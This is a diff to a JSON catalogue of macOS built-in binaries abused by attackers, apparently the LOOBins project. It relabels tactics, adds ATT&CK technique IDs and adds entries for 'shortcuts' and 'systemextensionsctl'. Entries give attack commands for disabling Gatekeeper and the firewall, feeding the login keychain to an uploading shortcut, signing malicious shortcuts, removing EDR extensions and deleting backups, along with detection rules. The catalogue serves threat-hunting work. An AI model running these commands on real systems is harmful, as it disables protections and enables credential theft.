@@ -3908,10 +4830,13 @@
         "description": "The command is designed to enhance privacy by muting the system volume,using a less recognizable \"Whisper\" voice with the \"say\" command, processing the copied text in the clipboard, and saving the output to a file named \"loot.txt.\"",
         "code": "osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Reconnaissance",
           "Discovery",
           "Collection"
+        ],
+        "techniques": [
+          "T1115"
         ],
         "tags": [
           "pbpaste",
@@ -3952,6 +4877,9 @@
         "tactics": [
           "Collection"
         ],
+        "techniques": [
+          "T1113"
+        ],
         "tags": [
           "oneliner"
         ]
@@ -3987,7 +4915,11 @@
         "code": "applescript://com.apple.scripteditor?action=new&script=<URL-ENCODED_APPLESCRIPT>",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059.002",
+          "T1204.001"
         ],
         "tags": [
           "application",
@@ -4043,6 +4975,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network"
         ]
@@ -4053,6 +4988,9 @@
         "code": "scutil --proxy",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1016"
         ],
         "tags": [
           "network",
@@ -4066,6 +5004,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network",
           "configuration"
@@ -4077,6 +5018,9 @@
         "code": "scutil --get { HostName | LocalHostName | ComputerName }",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "configuration"
@@ -4118,6 +5062,9 @@
         "tactics": [
           "Credential Access"
         ],
+        "techniques": [
+          "T1555.001"
+        ],
         "tags": [
           "bash"
         ]
@@ -4129,6 +5076,9 @@
         "tactics": [
           "Credential Access"
         ],
+        "techniques": [
+          "T1555.001"
+        ],
         "tags": [
           "bash",
           "chrome"
@@ -4139,7 +5089,10 @@
         "description": "This command will add a certificate to the keychain.",
         "code": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.004"
         ],
         "tags": [
           "bash",
@@ -4197,7 +5150,10 @@
         "code": "for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done",
         "tactics": [
           "Persistence",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1564.001"
         ],
         "tags": [
           "bash",
@@ -4210,7 +5166,10 @@
         "description": "Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.",
         "code": "SetFile -d \"04/25/2023 11:11:00\" -m \"04/25/2023 11:12:00\" targetfile.txt",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070.006"
         ],
         "tags": [
           "bash",
@@ -4250,6 +5209,7 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [],
         "tags": [
           "bash",
           "startup"
@@ -4260,8 +5220,9 @@
         "description": "Reset all third-party Login Items and revert to installation defaults.",
         "code": "sfltool resetbtm",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
         ],
+        "techniques": [],
         "tags": [
           "bash",
           "system-reset"
@@ -4303,11 +5264,13 @@
         "tactics": [
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1570"
+        ],
         "tags": [
           "smb",
           "file-sharing",
-          "file-transfer",
-          "lateral-movement"
+          "file-transfer"
         ]
       }
     ],
@@ -4333,6 +5296,103 @@
     "acknowledgements": []
   },
   {
+    "name": "shortcuts",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "List, run, and sign Shortcuts automation workflows from the command line.",
+    "full_description": "shortcuts is the command-line interface to the Shortcuts app introduced in macOS Monterey. It can list the current user's shortcuts, run a shortcut by name or identifier with file input and output, and sign shortcut files for sharing. Shortcuts can contain scripting actions such as \"Run Shell Script\", \"Run AppleScript\", and \"Run JavaScript for Automation\", as well as actions that read files and send data to remote URLs. An attacker can use the shortcuts binary to proxy execution of these actions through an Apple-signed process, enumerate a user's existing automations, and prepare signed shortcut files for delivery to victims. Scripting actions only run when \"Allow Running Scripts\" is enabled in the Shortcuts Advanced settings.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Enumerate a user's shortcuts",
+        "description": "List the shortcuts and folders in the current user's Shortcuts library, including their identifiers. Existing shortcuts can reveal automations that interact with sensitive apps, files, or services, and identify shortcuts that can be modified or run for proxy execution.",
+        "code": "shortcuts list --show-identifiers\nshortcuts list --folders",
+        "tactics": [
+          "Discovery"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash"
+        ]
+      },
+      {
+        "name": "Proxy execution of a shortcut that contains a scripting action",
+        "description": "Run a shortcut that contains a \"Run Shell Script\", \"Run AppleScript\", or \"Run JavaScript for Automation\" action. The script runs as a child of the Shortcuts infrastructure rather than as a direct child of the attacker's shell, which can break simple parent-child process detection logic.",
+        "code": "shortcuts run \"Update Helper\"",
+        "tactics": [
+          "Execution",
+          "Stealth"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "osascript"
+        ]
+      },
+      {
+        "name": "Pass a file to a shortcut for collection or exfiltration",
+        "description": "The --input-path option passes one or more files to a shortcut and --output-path writes its result to disk. A shortcut that uses the \"Get Contents of URL\" action can upload the supplied file to an attacker-controlled server.",
+        "code": "shortcuts run \"Backup\" --input-path ~/Library/Keychains/login.keychain-db --output-path /tmp/result.txt",
+        "tactics": [
+          "Collection",
+          "Exfiltration"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "file-transfer",
+          "network"
+        ]
+      },
+      {
+        "name": "Sign a malicious shortcut for distribution",
+        "description": "Sign a shortcut file so that anyone can import it. Signed shortcuts can be delivered through phishing or downloads and imported by a victim with open, after which they can be run with shortcuts run.",
+        "code": "shortcuts sign --mode anyone --input malicious.shortcut --output signed.shortcut\nopen signed.shortcut",
+        "tactics": [
+          "Resource Development",
+          "Initial Access"
+        ],
+        "techniques": [],
+        "tags": [
+          "bash"
+        ]
+      }
+    ],
+    "paths": [
+      "/usr/bin/shortcuts"
+    ],
+    "detections": [
+      {
+        "name": "Process execution detection: shortcuts run invoked by a script interpreter, an unsigned process, or a process launched from a download or temporary directory",
+        "url": "N/A"
+      },
+      {
+        "name": "Process execution detection: shells or script interpreters (sh, bash, zsh, osascript, python3) spawned by the Shortcuts infrastructure (WorkflowKit / BackgroundShortcutRunner)",
+        "url": "N/A"
+      },
+      {
+        "name": "Command-line detection: shortcuts sign with --mode anyone, or shortcuts run with --input-path referencing credential stores such as ~/Library/Keychains, ~/.ssh, or browser profile directories",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "Run shortcuts from the command line - Apple Support",
+        "url": "https://support.apple.com/guide/shortcuts-mac/run-shortcuts-from-the-command-line-apd455c82f02/mac"
+      },
+      {
+        "name": "Advanced Privacy and security settings in Shortcuts on Mac - Apple Support",
+        "url": "https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac"
+      },
+      {
+        "name": "shortcuts man page - SS64",
+        "url": "https://ss64.com/mac/shortcuts.html"
+      }
+    ],
+    "acknowledgements": []
+  },
+  {
     "name": "snmptrap",
     "author": "Ryan Conry (Cisco Talos)",
     "short_description": "Send SNMP trap notifications; receive them with snmptrapd.",
@@ -4347,6 +5407,9 @@
           "Lateral Movement",
           "Exfiltration",
           "Command and Control"
+        ],
+        "techniques": [
+          "T1048"
         ],
         "tags": [
           "snmp",
@@ -4389,7 +5452,10 @@
         "description": "Turning the firewall off with --setglobalstate off removes all per-application inbound filtering and the associated \"allow incoming connections?\" prompts, so any listening service an attacker plants on the host becomes reachable from the network. Requires root.",
         "code": "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1686"
         ],
         "tags": [
           "firewall"
@@ -4400,9 +5466,12 @@
         "description": "--add registers an application with the firewall and --unblockapp marks it as allowed to receive inbound connections. Applied to a bind shell or C2 implant, this creates a persistent firewall allow-list entry so the implant accepts connections while the firewall stays enabled. Requires root, and the binary must exist at the referenced path.",
         "code": "/usr/libexec/ApplicationFirewall/socketfilterfw --add <IMPLANT_PATH> && /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp <IMPLANT_PATH>",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Persistence",
           "Command and Control"
+        ],
+        "techniques": [
+          "T1686"
         ],
         "tags": [
           "firewall"
@@ -4413,7 +5482,10 @@
         "description": "Block-all mode blocks incoming connections to all non-essential applications, including signed ones, and is sometimes enabled as a hardening measure. Turning it off with --setblockall off reverses that hardening so a listening implant is once again reachable while the firewall itself remains on. Requires root.",
         "code": "/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall off",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1686"
         ],
         "tags": [
           "firewall"
@@ -4425,6 +5497,9 @@
         "code": "/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1518.001"
         ],
         "tags": [
           "firewall",
@@ -4479,6 +5554,10 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082",
+          "T1518"
+        ],
         "tags": [
           "system-info"
         ]
@@ -4489,6 +5568,9 @@
         "code": "softwareupdate --schedule",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "system-info"
@@ -4524,7 +5606,10 @@
         "description": "The --master-disable switch disables Gatekeeper. The command must be run with root/sudo permission.",
         "code": "sudo spctl --master-disable",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
           "gatekeeper"
@@ -4566,6 +5651,7 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [],
         "tags": [
           "permissions"
         ]
@@ -4577,6 +5663,9 @@
         "tactics": [
           "Collection",
           "Credential Access"
+        ],
+        "techniques": [
+          "T1539"
         ],
         "tags": [
           "oneliner",
@@ -4590,6 +5679,9 @@
         "tactics": [
           "Collection",
           "Credential Access"
+        ],
+        "techniques": [
+          "T1005"
         ],
         "tags": [
           "oneliner",
@@ -4639,7 +5731,10 @@
         "code": "ssh-keygen -D /private/tmp/evil.dylib",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1129"
         ],
         "tags": [
           "dylib"
@@ -4678,6 +5773,10 @@
           "Collection",
           "Exfiltration"
         ],
+        "techniques": [
+          "T1560.001",
+          "T1048"
+        ],
         "tags": [
           "files",
           "compress"
@@ -4715,6 +5814,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "configuration"
@@ -4726,6 +5828,9 @@
         "code": "sw_vers -productVersion",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -4739,6 +5844,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "configuration"
@@ -4750,6 +5858,9 @@
         "code": "sw_vers -buildVersion",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -4792,8 +5903,10 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1059"
+        ],
         "tags": [
-          "swift",
           "repl",
           "bash",
           "zsh"
@@ -4805,10 +5918,12 @@
         "code": "echo 'print(\"loobins\")' | swift -",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059"
         ],
         "tags": [
-          "swift",
           "repl",
           "bash",
           "zsh"
@@ -4820,10 +5935,12 @@
         "code": "swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:\"/bin/bash\"); process.arguments = [\"-c\", \"ls -alh\"]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));'",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1059"
         ],
         "tags": [
-          "swift",
           "repl",
           "bash",
           "zsh"
@@ -4881,6 +5998,9 @@
         "tactics": [
           "Initial Access"
         ],
+        "techniques": [
+          "T1078.001"
+        ],
         "tags": []
       },
       {
@@ -4889,6 +6009,9 @@
         "code": "sudo sysadminctl -addUser randomUser -password \"randomPassword\"\n",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1136.001"
         ],
         "tags": [
           "users"
@@ -4901,6 +6024,9 @@
         "tactics": [
           "Persistence"
         ],
+        "techniques": [
+          "T1136.001"
+        ],
         "tags": [
           "users"
         ]
@@ -4911,6 +6037,9 @@
         "code": "sudo sysadminctl -resetPasswordFor randomUser -newPassword \"randomPassword\"\n",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1098"
         ],
         "tags": [
           "password",
@@ -4924,6 +6053,9 @@
         "tactics": [
           "Impact"
         ],
+        "techniques": [
+          "T1531"
+        ],
         "tags": [
           "users"
         ]
@@ -4935,6 +6067,7 @@
         "tactics": [
           "Exfiltration"
         ],
+        "techniques": [],
         "tags": []
       },
       {
@@ -4944,6 +6077,7 @@
         "tactics": [
           "Exfiltration"
         ],
+        "techniques": [],
         "tags": []
       }
     ],
@@ -4986,6 +6120,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "oneliner"
@@ -5023,6 +6160,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -5034,6 +6174,9 @@
         "code": "system_profiler SPHardwareDataType",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -5047,6 +6190,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -5059,6 +6205,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1518"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -5070,6 +6219,9 @@
         "code": "system_profiler SPPowerDataType",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -5103,6 +6255,108 @@
     "acknowledgements": []
   },
   {
+    "name": "systemextensionsctl",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "Enumerate and manage system extensions, including EDR and network security extensions.",
+    "full_description": "systemextensionsctl examines and manages system extensions, the user-space replacement for kernel extensions introduced in macOS Catalina. Endpoint security, network extension, and DriverKit components of EDR, DLP, VPN, and content filtering products are installed as system extensions. Any user can run systemextensionsctl list to identify installed security tooling. The uninstall, reset, and developer subcommands can remove security extensions or relax extension loading checks, but currently require System Integrity Protection (SIP) to be disabled, so they are most relevant after an attacker has disabled SIP or on hosts where SIP is already off.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Enumerate installed security products",
+        "description": "List all installed system extensions with their Team ID, bundle ID, version, and state. Filtering on the endpoint security and network extension categories identifies EDR agents, firewalls, VPNs, and content filters installed on the host. This command does not require root.",
+        "code": "systemextensionsctl list\nsystemextensionsctl list com.apple.system_extension.endpoint_security\nsystemextensionsctl list com.apple.system_extension.network_extension",
+        "tactics": [
+          "Discovery"
+        ],
+        "techniques": [
+          "T1518.001"
+        ],
+        "tags": [
+          "oneliner",
+          "bash",
+          "edr"
+        ]
+      },
+      {
+        "name": "Uninstall an EDR system extension",
+        "description": "Uninstall a specific system extension by Team ID and bundle ID, as returned by systemextensionsctl list. Removing an endpoint security extension stops the security product from receiving Endpoint Security events. This requires SIP to be disabled.",
+        "code": "sudo systemextensionsctl uninstall <teamID> <bundleID>",
+        "tactics": [
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
+        ],
+        "tags": [
+          "oneliner",
+          "bash",
+          "edr"
+        ]
+      },
+      {
+        "name": "Remove all system extensions",
+        "description": "Forcibly reset system extension state, removing every installed system extension and clearing related state in a single command. This requires SIP to be disabled.",
+        "code": "sudo systemextensionsctl reset",
+        "tactics": [
+          "Defense Impairment",
+          "Impact"
+        ],
+        "techniques": [
+          "T1685"
+        ],
+        "tags": [
+          "oneliner",
+          "bash",
+          "edr"
+        ]
+      },
+      {
+        "name": "Enable system extension developer mode",
+        "description": "Turn on developer mode, which skips the version check performed when a new system extension is examined. This can be used to replace an installed extension with an attacker-modified build. This requires SIP to be disabled.",
+        "code": "sudo systemextensionsctl developer on",
+        "tactics": [
+          "Defense Impairment",
+          "Persistence"
+        ],
+        "techniques": [
+          "T1685"
+        ],
+        "tags": [
+          "oneliner",
+          "bash"
+        ]
+      }
+    ],
+    "paths": [
+      "/usr/bin/systemextensionsctl"
+    ],
+    "detections": [
+      {
+        "name": "Command-line detection: systemextensionsctl with uninstall, reset, or developer on arguments",
+        "url": "N/A"
+      },
+      {
+        "name": "Process execution detection: systemextensionsctl list executed by a script interpreter, an unsigned process, or a non-administrative user session",
+        "url": "N/A"
+      },
+      {
+        "name": "Correlation: systemextensionsctl uninstall or reset following a csrutil disable or csrutil status check",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "System Extensions and DriverKit - Apple Developer",
+        "url": "https://developer.apple.com/system-extensions/"
+      },
+      {
+        "name": "Impair Defenses: Disable or Modify Tools - MITRE ATT&CK",
+        "url": "https://attack.mitre.org/techniques/T1562/001/"
+      }
+    ],
+    "acknowledgements": []
+  },
+  {
     "name": "systemsetup",
     "author": "Hare Sudhan (@cyb3rbuff)",
     "short_description": "Enable remote login, remote apple events for the machine",
@@ -5116,6 +6370,9 @@
         "tactics": [
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1021.004"
+        ],
         "tags": [
           "ssh",
           "configuration"
@@ -5127,6 +6384,9 @@
         "code": "sudo systemsetup -setremoteappleevents on\n",
         "tactics": [
           "Lateral Movement"
+        ],
+        "techniques": [
+          "T1021"
         ],
         "tags": [
           "configuration"
@@ -5166,11 +6426,13 @@
         "description": "Banshee Stealer resets the permissions that have already been allowed to applications on the system, which will cause the user to be prompted to give them again. This action may be intended to trick the user into unknowingly giving authorizations to the malware.",
         "code": "tccutil reset AppleEvents",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1548.006"
         ],
         "tags": [
-          "bash",
-          "tccutil"
+          "bash"
         ]
       },
       {
@@ -5178,11 +6440,13 @@
         "description": "Attackers use tccutil to reset permissions for services like Camera, Microphone, or AppleEvents.",
         "code": "tccutil reset AppleEvents com.apple.Terminal",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1548.006"
         ],
         "tags": [
-          "bash",
-          "tccutil"
+          "bash"
         ]
       }
     ],
@@ -5221,6 +6485,9 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1129"
+        ],
         "tags": [
           "dylib"
         ]
@@ -5257,8 +6524,11 @@
         "description": "A one-liner can load the content of multiple RTF files in a directory, concatenate their contents, and write the results out as a new file. This provides two sub-use-cases; one is building a malicious file from a collection of smaller files which could evade both network and host-based security controls as the traditional means of signature-based detection would be redundant; two is concatenating the content of several, potentially sensitive files before exfiltration. This command can also be looped to iterate a directory of files.",
         "code": "textutil -convert html Quote.doc secondQuote.doc",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Collection"
+        ],
+        "techniques": [
+          "T1005"
         ],
         "tags": [
           "bash",
@@ -5272,6 +6542,9 @@
         "tactics": [
           "Credential Access",
           "Collection"
+        ],
+        "techniques": [
+          "T1115"
         ],
         "tags": [
           "bash",
@@ -5313,8 +6586,10 @@
           "Lateral Movement",
           "Persistence"
         ],
+        "techniques": [
+          "T1570"
+        ],
         "tags": [
-          "tftp",
           "launchctl",
           "file-transfer"
         ]
@@ -5326,8 +6601,10 @@
         "tactics": [
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1570"
+        ],
         "tags": [
-          "tftp",
           "file-transfer",
           "oneliner"
         ]
@@ -5338,11 +6615,14 @@
         "code": "mkdir -p /tmp/tftp_server && chmod 777 /tmp/tftp_server\ntee /tmp/com.user.tftp.plist > /dev/null << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.user.tftp</string>\n    <key>WorkingDirectory</key>\n    <string>/tmp/tftp_server</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/usr/libexec/tftpd</string>\n        <string>-w</string>\n        <string>-l</string>\n        <string>-u</string>\n        <string>$(whoami)</string>\n    </array>\n    <key>inetdCompatibility</key>\n    <dict>\n        <key>Wait</key>\n        <true/>\n    </dict>\n    <key>Sockets</key>\n    <dict>\n        <key>Listeners</key>\n        <dict>\n            <key>SockServiceName</key>\n            <string>6969</string>\n            <key>SockType</key>\n            <string>dgram</string>\n            <key>SockFamily</key>\n            <string>IPv4</string>\n        </dict>\n    </dict>\n</dict>\n</plist>\nEOF\nlaunchctl load -w /tmp/com.user.tftp.plist",
         "tactics": [
           "Lateral Movement",
-          "Defense Evasion",
+          "Stealth",
           "Persistence"
         ],
+        "techniques": [
+          "T1570",
+          "T1543.001"
+        ],
         "tags": [
-          "tftp",
           "launchctl",
           "file-transfer",
           "unprivileged"
@@ -5397,6 +6677,9 @@
         "tactics": [
           "Impact"
         ],
+        "techniques": [
+          "T1490"
+        ],
         "tags": [
           "backup"
         ]
@@ -5407,6 +6690,9 @@
         "code": "tmutil delete /path/to/backup",
         "tactics": [
           "Impact"
+        ],
+        "techniques": [
+          "T1490"
         ],
         "tags": [
           "delete"
@@ -5419,6 +6705,9 @@
         "tactics": [
           "Collection"
         ],
+        "techniques": [
+          "T1005"
+        ],
         "tags": [
           "restore"
         ]
@@ -5430,6 +6719,7 @@
         "tactics": [
           "Privilege Escalation"
         ],
+        "techniques": [],
         "tags": [
           "unprivileged"
         ]
@@ -5439,8 +6729,9 @@
         "description": "An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.",
         "code": "tmutil addexclusion /path/to/exclude",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "backup"
         ]
@@ -5495,7 +6786,10 @@
         "description": "trash moves each named file or directory into ~/.Trash. On the same volume this is a rename rather than an unlink(2) of the original path, so endpoint rules and log-based monitoring keyed on rm, unlink, or secure-delete utilities do not fire when an artifact leaves its staging location. A directory is moved as a whole subtree in one call, replacing an rm -rf walk. The running account needs an existing ~/.Trash (present for a normal login user). Items land in the Trash and stay recoverable until it is emptied, so this hides the removal from deletion telemetry rather than destroying the data.\n",
         "code": "trash /private/tmp/stage.bin /Users/<USER>/Library/LaunchAgents/com.attacker.helper.plist /Users/<USER>/Library/Caches/.workdir",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070.004"
         ],
         "tags": [
           "indicator-removal"
@@ -5506,7 +6800,10 @@
         "description": "The --stopOnError (-s) flag makes trash exit with an error if any item cannot be moved to the Trash, and --verbose (-v) reports each move. A cleanup or self-destruct routine uses these to confirm that every artifact was removed and to branch to a fallback if one could not be, without calling rm. The removed items still land in ~/.Trash and are recoverable until the Trash is emptied.\n",
         "code": "trash --stopOnError --verbose /private/tmp/impl /private/tmp/creds.json",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070.004"
         ],
         "tags": [
           "cleanup"
@@ -5551,10 +6848,12 @@
         "code": "xattr -d com.apple.quarantine FILE",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
-          "xattr",
           "quarantine"
         ]
       },
@@ -5564,10 +6863,12 @@
         "code": "xattr -d -r com.apple.quarantine *",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
-          "xattr",
           "quarantine"
         ]
       },
@@ -5577,10 +6878,12 @@
         "code": "xattr -c FILE",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
-          "xattr",
           "quarantine"
         ]
       },
@@ -5590,10 +6893,12 @@
         "code": "xattr -cr DIRECTORY",
         "tactics": [
           "Execution",
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1553.001"
         ],
         "tags": [
-          "xattr",
           "quarantine"
         ]
       }
